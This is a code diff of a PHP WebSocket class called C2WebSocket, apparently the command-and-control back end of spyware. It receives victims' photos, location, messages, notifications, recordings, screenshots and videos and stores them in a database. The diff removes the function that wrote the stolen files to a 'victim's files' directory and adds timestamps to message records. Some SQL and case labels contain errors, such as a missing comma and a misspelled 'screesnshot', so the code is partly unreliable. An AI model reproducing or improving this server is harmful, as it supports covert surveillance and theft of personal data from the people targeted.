@@ -10,9 +10,6 @@ class C2WebSocket implements MessageComponentInterface {
 
     protected $clients;
 
-    /** @var string $fileUploadPath Directory for saving victim's files */
-    private string $fileUploadPath = __DIR__ . '/../../files/';
-
     /** @var Database $database Database instance */
     private Database $database;
 
@@ -52,20 +49,6 @@ class C2WebSocket implements MessageComponentInterface {
     }
 
     /**
-     * Write contents to a file
-     * 
-     * @param string $content
-     * @param string $filename
-     */
-    private function writeFile(string $content, string $filename, string $type): void
-    {
-        // Use FILE_APPEND flag to append content if the file exists
-        // Use LOCK_EX flag to acquire an exclusive lock on the file
-        $path = $this->fileUploadPath . $type . '/' . $filename;
-        file_put_contents($path, base64_decode($content), FILE_APPEND | LOCK_EX);
-    }
-
-    /**
      * Handle client connections
      * 
      * @param ConnectionInterface $conn
@@ -87,7 +70,6 @@ class C2WebSocket implements MessageComponentInterface {
                 $filename = base64_decode($data['filename']);
                 $timestamp = $data['timestamp'];
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
-                $this->writeFile($data['content'], $filename, 'images');
                 break;
             case "location":
                 $query = "INSERT INTO LOCATION(client_id, latitude, longitude altitude) VALUES(?, ?, ?, ?)";
@@ -97,10 +79,11 @@ class C2WebSocket implements MessageComponentInterface {
                 $this->database->insert($query, [$clientID, $latitude, $longitude, $altitude]);
                 break;
             case "message":
-                $query = "INSERT INTO MESSAGE(client_id, sender, content) VALUES(?, ?, ?)";
+                $query = "INSERT INTO MESSAGE(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
                 $sender = base64_decode($data['sender']);
                 $content = base64_decode($data['content']);
-                $this->database->insert($query, [$sender, $content]);
+                $timestamp = $data['timestamp'];
+                $this->database->insert($query, [$sender, $content, $timestamp]);
                 break;
             case "notification":
                 $query = "INSERT INTO NOTIFICATION(client_id, sender, content, timestamp) VALUES(?, ?, ?, ?)";
@@ -114,21 +97,18 @@ class C2WebSocket implements MessageComponentInterface {
                 $filename = base64_decode($data['filename']);
                 $timestamp = $data['timestamp'];
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
-                $this->writeFile($data['content'], $filename, 'recordings');
                 break;
             case "screesnshot":
                 $query = "INSERT INTO SCREENSHOT(client_id, filename, timestamp) VALUES(?, ?, ?)";
                 $filename = base64_decode($data['filename']);
                 $timestamp = $data['timestamp'];
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
-                $this->writeFile($data['content'], $filename, 'screenshots');
                 break;
             case "video":
                 $query = "INSERT INTO VIDEO(client_id, filename, timestamp) VALUES(?, ?, ?)";
                 $filename = base64_decode($data['filename']);
                 $timestamp = $data['timestamp'];
                 $this->database->insert($query, [$clientID, $filename, $timestamp]);
-                $this->writeFile($data['content'], $filename, 'videos');
                 break;
             default:
                 break;
